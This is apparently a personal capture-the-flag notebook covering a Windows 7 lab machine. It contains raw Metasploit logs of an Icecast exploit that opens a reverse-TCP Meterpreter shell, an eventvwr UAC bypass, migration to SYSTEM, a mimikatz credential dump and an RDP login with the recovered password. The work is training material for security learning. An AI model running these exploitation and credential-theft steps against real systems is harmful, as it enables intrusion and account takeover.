# CTF
A note containing my adventures and documentation for cyber security quests


# Port Enumeration
```
PORT      STATE  SERVICE      VERSION
135/tcp   open   msrpc        Microsoft Windows RPC
138/tcp   closed netbios-dgm
445/tcp   open   microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open   tcpwrapped
| rdp-ntlm-info: 
|   Target_Name: DARK-PC
|   NetBIOS_Domain_Name: DARK-PC
|   NetBIOS_Computer_Name: DARK-PC
|   DNS_Domain_Name: Dark-PC
|   DNS_Computer_Name: Dark-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2023-01-11T04:43:28+00:00
|_ssl-date: 2023-01-11T04:43:42+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=Dark-PC
| Not valid before: 2023-01-10T04:00:50
|_Not valid after:  2023-07-12T04:00:50
5357/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8000/tcp  open   http         Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
49152/tcp open   msrpc        Microsoft Windows RPC
49153/tcp open   msrpc        Microsoft Windows RPC
49154/tcp open   msrpc        Microsoft Windows RPC
49158/tcp open   msrpc        Microsoft Windows RPC
49159/tcp open   msrpc        Microsoft Windows RPC
49160/tcp open   msrpc        Microsoft Windows RPC
````
# Gain Access
```
I used msfconsole and searched for icecast

msf6 > search icecast

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header

msf6 > use 0
msf6 exploit(windows/http/icecast_header) > show options

Module options (exploit/windows/http/icecast_header):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   8000             yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

  msf6 exploit(windows/http/icecast_header) > set RHOST 10.10.95.255
  RHOST => 10.10.95.255
  msf6 exploit(windows/http/icecast_header) > set LHOST tun0
  LHOST => tun0
  msf6 exploit(windows/http/icecast_header) > run

  [*] Started reverse TCP handler on 10.18.70.19:4444 
  [*] Sending stage (175686 bytes) to 10.10.95.255
  [*] Meterpreter session 1 opened (10.18.70.19:4444 -> 10.10.95.255:49248) at 2023-01-11 00:09:25 -0500

  meterpreter > ls
  Listing: C:\Program Files (x86)\Icecast2 Win32
  ==============================================

  Mode              Size    Type  Last modified              Name
  ----              ----    ----  -------------              ----
  100777/rwxrwxrwx  512000  fil   2004-01-08 09:26:45 -0500  Icecast2.exe
  040777/rwxrwxrwx  4096    dir   2019-11-12 18:04:09 -0500  admin
  040777/rwxrwxrwx  0       dir   2019-11-12 18:04:09 -0500  doc
  100666/rw-rw-rw-  3663    fil   2004-01-08 09:25:30 -0500  icecast.xml
  100777/rwxrwxrwx  253952  fil   2004-01-08 09:27:09 -0500  icecast2console.exe
  100666/rw-rw-rw-  872448  fil   2002-06-27 21:11:54 -0400  iconv.dll
  100666/rw-rw-rw-  188477  fil   2003-04-12 23:29:12 -0400  libcurl.dll
  100666/rw-rw-rw-  631296  fil   2002-07-10 22:09:00 -0400  libxml2.dll
  100666/rw-rw-rw-  128000  fil   2002-07-10 22:11:54 -0400  libxslt.dll
  040777/rwxrwxrwx  0       dir   2019-11-12 18:26:02 -0500  logs
  100666/rw-rw-rw-  53299   fil   2002-03-23 09:48:14 -0500  pthreadVSE.dll
  100666/rw-rw-rw-  2380    fil   2019-11-12 18:04:09 -0500  unins000.dat
  100777/rwxrwxrwx  71588   fil   2003-04-14 04:00:00 -0400  unins000.exe
  040777/rwxrwxrwx  0       dir   2019-11-12 18:04:09 -0500  web

  meterpreter > pwd
  C:\Program Files (x86)\Icecast2 Win32
  meterpreter > whoami
  [-] Unknown command: whoami
  meterpreter > dir
  Listing: C:\Program Files (x86)\Icecast2 Win32
  ==============================================

  Mode              Size    Type  Last modified              Name
  ----              ----    ----  -------------              ----
  100777/rwxrwxrwx  512000  fil   2004-01-08 09:26:45 -0500  Icecast2.exe
  040777/rwxrwxrwx  4096    dir   2019-11-12 18:04:09 -0500  admin
  040777/rwxrwxrwx  0       dir   2019-11-12 18:04:09 -0500  doc
  100666/rw-rw-rw-  3663    fil   2004-01-08 09:25:30 -0500  icecast.xml
  100777/rwxrwxrwx  253952  fil   2004-01-08 09:27:09 -0500  icecast2console.exe
  100666/rw-rw-rw-  872448  fil   2002-06-27 21:11:54 -0400  iconv.dll
  100666/rw-rw-rw-  188477  fil   2003-04-12 23:29:12 -0400  libcurl.dll
  100666/rw-rw-rw-  631296  fil   2002-07-10 22:09:00 -0400  libxml2.dll
  100666/rw-rw-rw-  128000  fil   2002-07-10 22:11:54 -0400  libxslt.dll
  040777/rwxrwxrwx  0       dir   2019-11-12 18:26:02 -0500  logs
  100666/rw-rw-rw-  53299   fil   2002-03-23 09:48:14 -0500  pthreadVSE.dll
  100666/rw-rw-rw-  2380    fil   2019-11-12 18:04:09 -0500  unins000.dat
  100777/rwxrwxrwx  71588   fil   2003-04-14 04:00:00 -0400  unins000.exe
  040777/rwxrwxrwx  0       dir   2019-11-12 18:04:09 -0500  web

  meterpreter > getuid
  Server username: Dark-PC\Dark
  meterpreter > sysinfo
  Computer        : DARK-PC
  OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
  Architecture    : x64
  System Language : en_US
  Domain          : WORKGROUP
  Logged On Users : 2
  Meterpreter     : x86/windows
  meterpreter > run post/multi/recon/local_exploit_suggester

  [*] 10.10.95.255 - Collecting local exploits for x86/windows...

  [*] 10.10.95.255 - 176 exploit checks are being tried...
  [+] 10.10.95.255 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
  [+] 10.10.95.255 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
  [+] 10.10.95.255 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
  [+] 10.10.95.255 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
  [+] 10.10.95.255 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
  [+] 10.10.95.255 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
  [+] 10.10.95.255 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
  [+] 10.10.95.255 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
  [+] 10.10.95.255 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
  [*] Running check method for exploit 41 / 41
  [*] 10.10.95.255 - Valid modules for session 1:
  ============================

   #   Name                                                           Potentially Vulnerable?  Check Result
   -   ----                                                           -----------------------  ------------
   1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
   2   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.                                                                                                                          
   3   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
   4   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
   5   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
   6   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
   7   exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
   8   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
   9   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
   10  exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.

Once I got the exploit name, I background the current meterpreter session and I searched for the exploit

background
[*] Backgrounding session 1...
msf6 exploit(windows/http/icecast_header) > search eventvwr

Matching Modules
================

   #  Name                                      Disclosure Date  Rank       Check  Description
   -  ----                                      ---------------  ----       -----  -----------
   0  exploit/windows/local/bypassuac_eventvwr  2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)                                                                                                                     
msf6 exploit(windows/http/icecast_header) > use 0
msf6 exploit(windows/local/bypassuac_eventvwr) > show options

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86
msf6 exploit(windows/local/bypassuac_eventvwr) > set LHOST tun0
LHOST => tun0
msf6 exploit(windows/local/bypassuac_eventvwr) > set session 1
session => 1
msf6 exploit(windows/local/bypassuac_eventvwr) > show options

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86



View the full module info with the info, or info -d command.
msf6 exploit(windows/local/bypassuac_eventvwr) > run

[*] Started reverse TCP handler on 10.18.70.19:4444 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (175686 bytes) to 10.10.95.255
[*] Meterpreter session 2 opened (10.18.70.19:4444 -> 10.10.95.255:49265) at 2023-01-11 00:23:57 -0500
[*] Cleaning up registry keys ...

meterpreter > getuid
Server username: Dark-PC\Dark
meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(windows/local/bypassuac_eventvwr) > sessions

Active sessions
===============

  Id  Name  Type                     Information             Connection
  --  ----  ----                     -----------             ----------
  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.18.70.19:4444 -> 10.10.95.255:49248 (10.10.95.255)
  2         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.18.70.19:4444 -> 10.10.95.255:49265 (10.10.95.255)

msf6 exploit(windows/local/bypassuac_eventvwr) > session `
[-] Unknown command: session
msf6 exploit(windows/local/bypassuac_eventvwr) > session 1
[-] Unknown command: session
msf6 exploit(windows/local/bypassuac_eventvwr) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getprivws
[-] Unknown command: getprivws
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/local/bypassuac_eventvwr) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege



```

# Looting
```
meterpreter > migrate -N spoolsv.exe 
[*] Migrating from 2756 to 1380...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > load kiwi
Loading extension kiwi.../usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:998: warning: Exception in finalizer #<Proc:0x00007fb0120e6bd0 /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:339>
/usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:147:in `synchronize': can't be called from trap context (ThreadError)
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:147:in `send_packet'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:220:in `send_packet_wait_response'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:176:in `send_request'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:362:in `close'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:339:in `block in finalize'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:998:in `chr'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:998:in `block in xor_bytes'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:997:in `each_byte'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:997:in `xor_bytes'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:952:in `to_r'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:137:in `send_packet'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:220:in `send_packet_wait_response'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:293:in `load_library'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:378:in `use'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/core.rb:1337:in `block in cmd_load'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/core.rb:1307:in `each'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/core.rb:1307:in `cmd_load'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:102:in `run_command'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:64:in `block in interact'
        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:157:in `run'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:62:in `interact'
        from /usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:565:in `_interact'
        from /usr/share/metasploit-framework/lib/rex/ui/interactive.rb:53:in `interact'
        from /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1682:in `cmd_sessions'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'
        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:162:in `run'
        from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
        from /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
        from /usr/bin/msfconsole:23:in `<main>'

  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session
    ssl_verify                Modify the SSL certificate verification setting
    transport                 Manage the transport mechanisms
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)

```
# Viewing Desktop
```
desktop -u Dark -p Password01! 10.10.137.57                               
Autoselecting keyboard map 'en-us' from locale
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Connection established using SSL.
Protocol(warning): process_pdu_logon(), Unhandled login infotype 1
Clipboard(error): xclip_handle_SelectionNotify(), unable to find a textual target to satisfy RDP clipboard text request
```
